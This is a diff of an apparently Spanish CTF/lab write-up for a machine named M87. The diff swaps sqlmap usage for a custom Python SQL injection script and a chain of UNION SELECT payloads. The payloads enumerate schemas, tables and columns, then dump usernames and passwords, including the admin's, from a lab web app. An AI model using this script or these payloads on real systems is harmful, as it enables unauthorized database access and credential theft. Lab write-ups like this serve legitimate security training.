@@ -120,38 +120,67 @@ MariaDB server version for the right syntax to use near ''' at line 1
 Login</span>
 </code></pre></div></div>
 
-<div><p>Con sqlmap podemos intentar ver las bases de datos existentes, parece interesante db</p></div>
+<div><p>Creamos un script que nos envie la petición con la query que le pasemos y nos muestre la respuesta que devuelve al aplicar la inyección sql</p></div>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
-<code><span class="s2">❯ sqlmap</span><span class="p"> --url </span><span class="no">"http://192.168.100.15/admin/backup/?id=1"</span><span class="p"> -dbs --batch
-[</span><span class="s2">INFO</span><span class="p">] fetching database names
-available databases [4]:
-[*] db
-[*] information_schema
-[*] mysql
-[*] performance_schema</span>
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">import </span><span class="p">sys, requests, urllib, re
+
+</span><span class="kd">if</span><span class="k"> len</span><span class="p">(sys.argv) </span><span class="kd"><</span><span class="na"> 2</span><span class="p">:
+    </span><span class="k">print</span><span class="p">(</span><span class="k">f</span><span class="s2">"\n\033[1;37m[\033[1;31m-\033[1;37m] Uso python3 {sys.argv[0]} <querysql>\n"</span><span class="p">)
+    exit(</span><span class="na">1</span><span class="p">)
+
+target </span><span class="kd">=</span><span class="s2"> "http://192.168.100.45/admin/backup/"</span><span class="p">
+payload </span><span class="kd">=</span><span class="p"> {</span><span class="s2">"id"</span><span class="p">:</span><span class="k"> f</span><span class="s2">"1 {sys.argv[1]}"</span><span class="p">}
+params </span><span class="kd">=</span><span class="p"> urllib.parse.urlencode(payload)
+request </span><span class="kd">=</span><span class="p"> requests.get(target, params=params)
+result </span><span class="kd">=</span><span class="p"> re.search(</span><span class="k">b</span><span class="s2">"\\r\\njack(.*?)\\n"</span><span class="p">, request.content)
+output </span><span class="kd">=</span><span class="k"> str</span><span class="p">(result.group(</span><span class="na">1</span><span class="p">), </span><span class="s2">"utf-8"</span><span class="p">)
+</span><span class="k">print</span><span class="p">(output.replace(</span><span class="s2">","</span><span class="p">, </span><span class="s2">"\n"</span><span class="p">))</span>
 </code></pre></div></div>
 
-<div><p>Ahora podemos dumpear la base de datos y encontramos credenciales entre ellas las de admin</p></div>
+<div><p>Iniciamos por ver que base de datos esta actualmente en uso y es db</p></div>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
-<code><span class="s2">❯ sqlmap</span><span class="p"> --url </span><span class="no">"http://192.168.100.15/admin/backup/?id=1"</span><span class="p"> -D db --dump --batch
-[</span><span class="s2">INFO</span><span class="p">] fetching entries for table 'users' in database 'db'
-Database: db
-Table: users
-[10 entries]
-+----+--------------------+-----------------+----------+
-| id | email              | password        | username |
-+----+--------------------+-----------------+----------+
-| 1  | jack@localhost     | gae5g5a         | jack     |
-| 2  | ceo@localhost      | 5t96y4i95y      | ceo      |
-| 3  | brad@localhost     | gae5g5a         | brad     |
-| 4  | expenses@localhost | 5t96y4i95y      | expenses |
-| 5  | julia@localhost    | fw54vrfwe45     | julia    |
-| 6  | mike@localhost     | 4kworw4         | mike     |
-| 7  | adrian@localhost   | fw54vrfwe45     | adrian   |
-| 8  | john@localhost     | 4kworw4         | john     |
-| </span><span class="kd">9</span><span class="p">  | </span><span class="kd">admin@localhost</span><span class="p">    | </span><span class="kd">15The4Dm1n4L1f3</span><span class="p"> | </span><span class="kd">admin</span><span class="p">    |
-| 10 | alex@localhost     | dsfsrw4         | alex     |
-+----+--------------------+-----------------+----------+</span>
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py </span><span class="no">"union select database()"</span><span class="p">
+db</span>
+</code></pre></div></div>
+
+<div><p>Ahora enumeramos las bases de datos existentes pero la que parece mas interesante es db</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py </span><span class="no">"union select group_concat(schema_name) from information_schema.schemata"</span><span class="p">
+information_schema
+mysql
+db
+performance_schema</span>
+</code></pre></div></div>
+
+<div><p>Entonces enumeramos las tablas existentes en la base de datos db aunque solo existe users</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py </span><span class="no">"union select group_concat(table_name) from information_schema.tables where table_schema='db'"</span><span class="p">
+users</span>
+</code></pre></div></div>
+
+<div><p>Entonces podemos enumerar las columnas de la table users de la base de datos db, podemos ver campos interesantes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py </span><span class="no">"union select group_concat(column_name) from information_schema.columns where table_schema='db' and table_name='users'"</span><span class="p">
+id
+username
+password
+email</span>
+</code></pre></div></div>
+
+<div><p>Finalmente solo leemos username y password, podemos ver credenciales, entre ellas las de admin</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py </span><span class="no">"union select group_concat(username,0x3a,password) from users"</span><span class="p">
+jack:gae5g5a
+ceo:5t96y4i95y
+brad:gae5g5a
+expenses:5t96y4i95y
+julia:fw54vrfwe45
+mike:4kworw4
+adrian:fw54vrfwe45
+john:4kworw4
+</span><span class="na">admin</span><span class="p">:</span><span class="kd">15The4Dm1n4L1f3</span><span class="p">
+alex:dsfsrw4</span>
 </code></pre></div></div>
 
 <div><p>Al probar parametros basicos como file podemos ver un lfi, y el usuario charlotte</p></div>
@@ -259,8 +288,6 @@ mindsflee
 
 </span><span class="s2">root@M87</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
 </code></pre></div></div>
-
-
 
 <p><a href="./../../">Página Principal</a></p>
 
